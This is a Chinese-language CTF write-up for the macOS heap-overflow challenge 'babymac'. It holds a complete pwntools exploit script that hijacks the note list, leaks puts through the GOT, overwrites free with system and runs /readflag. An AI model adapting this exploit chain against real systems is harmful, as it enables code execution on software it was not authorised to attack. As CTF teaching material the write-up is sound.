# babymac

## 题目简述

本题是 macOS 环境下的堆溢出题，漏洞效果可以做到任意地址写任意指针。程序维护 note 列表，利用堆溢出劫持 `note_list` 后，可以把列表项伪造成指向 GOT 或其他目标地址的条目，从而先泄露 `puts` 计算 `libsystem_c` 基址，再把 `free` 改写为 `system`，最后释放内容为 `/readflag` 的 chunk 获取 flag。

## 解题过程

mac下常规的堆溢出，实现任意地址写任意指针。

劫持note_list，实现libc leak和任意地址写，写free为system。然后free一个"/readflag"的chunk即可

出题人为了防止搅屎，所以只能通过system("/readflag")来获取flag

利用脚本的核心流程是：启动后先读取程序泄露的 text 地址，计算 `note_list`、`puts_got`、`free_got` 等位置；通过若干次 add/free/magic 触发堆布局，把某个 note 条目改造成指向 `note_list` 的伪结构；再用 show 泄露 `puts`，根据固定偏移得到 `libsystem_c` 和 `system`；最后把 `free_got` 写成 `system`，释放保存 `/readflag` 的 chunk。

```plain
from pwn import *
import sys
context.log_level = "DEBUG"
local = False
ip = sys.argv[1]
port = int(sys.argv[2],10)
if local:
	sh = process("./babyMac")
else:
	sh = remote(ip,port)
s       = lambda data               :sh.send(str(data))
sa      = lambda delim,data         :sh.sendafter(str(delim), str(data))
sl      = lambda data               :sh.sendline(str(data))
sla     = lambda delim,data         :sh.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
irt     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))
def add(size):
	sla(":","A")
	sla("?",str(size))
def edit(idx,content):
	sla(":","E")
	sla("?",str(idx))
	sa("?",str(content))
def show(idx):
	sla(":","S")
	sla("? ",str(idx))
def free(idx):
	sla(":","D")
	sla("?",str(idx))
def magic(idx,content):
	sla(":","M")
	sla("?",str(idx))
	sa("?",content)
def getText():
	sa("?","WMCTF")
while True:
	try:
		getText()
		ru("0x")
		text = int(ru("\n").strip(),16) - 0x1510
		note_list = text + 0x3080
		puts_got_offset = 0x3050
		puts_got = text + puts_got_offset
		printf_plt = 0x1A2A + text
		free_got = text + 0x3028
		log.success("text => " + hex(text))
		log.success("puts_got => " + hex(puts_got))
		for i in range(7):
			add(0x40)
		payload = '/readflag\x00'
		edit(6,payload)
		free(0)
		free(2)
		free(4)
		add(0x40)
		payload = 'a' * 0x40
		payload += p64(note_list) + p64((note_list >> 4))[0:7]
		magic(1,payload)
		add(0x40)
		payload  = p64(note_list) + p64(0x80)
		payload += p64(puts_got) + p64(0x80)
		payload += p64(free_got) + p64(0x80)
		edit(0,payload)
		show(1)
		puts = uu64(sh.recv(6))
		puts_offset = 0x3F630
		libsystem_c = puts - puts_offset
		system = libsystem_c + 0x77FDD
		execve_onegadget = 0x23F9E + libsystem_c
		one_gadget = 0x23F97 + libsystem_c
		#one_gadget = 0x23F97 + libsystem_c
		log.success("puts        => " + hex(puts))
		log.success("libsystem_c => " + hex(libsystem_c))
		log.success("system => " + hex(system))
		if not (puts > 0x7e0000000000 and puts < 0x7FFFFFFFFFFF):
		#if puts == 0x616161616161:
			sh.close()
			if local:
				sh = process("./babyMac")
			else:
				sh = remote(ip,port)
			continue

		edit(2,p64(system))
		free(6)
		#sh.recvuntil("flag{test}")
		#debug()
		sh.interactive()
	except EOFError:
		sh.close()
		if local:
			sh = process("./babyMac")
		else:
			sh = remote(ip,port)
		continue
sh.interactive()

```
运行 exploit 后进入交互，验证路径是 `free("/readflag")` 触发 `system("/readflag")` 并输出 flag。

## 方法总结

macOS 堆题的整体思路和 Linux 菜单堆题相似，但符号、库偏移和可用执行方式要按目标环境处理。本题的可复用点是先把堆溢出转成 note 表劫持，再用“伪条目指向 GOT”完成泄露和写 GOT；由于 flag 只能通过 `/readflag` 获取，最终选择 `free("/readflag") -> system("/readflag")`，而不是常见的一键 shell。
